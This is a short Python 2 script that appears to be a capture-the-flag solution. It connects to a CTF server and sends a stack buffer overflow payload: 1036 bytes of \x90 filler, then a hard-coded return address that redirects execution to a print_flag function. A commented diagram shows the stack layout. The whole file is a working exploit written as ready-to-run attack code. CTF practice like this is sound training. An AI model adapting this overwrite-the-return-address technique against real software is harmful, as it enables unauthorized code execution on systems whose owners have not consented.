from socket import *
import random

s = create_connection(("ctf.stratum0.net", 4445))
blob =  s.recv(1024)
print blob 

address = blob[64:73]
print 'Address: ' + address
address = "\x9c\x84\x04\x08"

# NOP SLED
#  _________________________________
# |     ret -> address(print_flag)  | -> 1040
# |     ebp -> \x90                 | -> 1036
# |     buf -> \x90                 | -> 1028
# |     buf -> \x90                 | -> 1024
# |_________________________________|

rcommand =  "\x90"*1036
rcommand += address
print rcommand

s.send(rcommand + "\n")
print s.recv(1050)
print s.recv(1050)
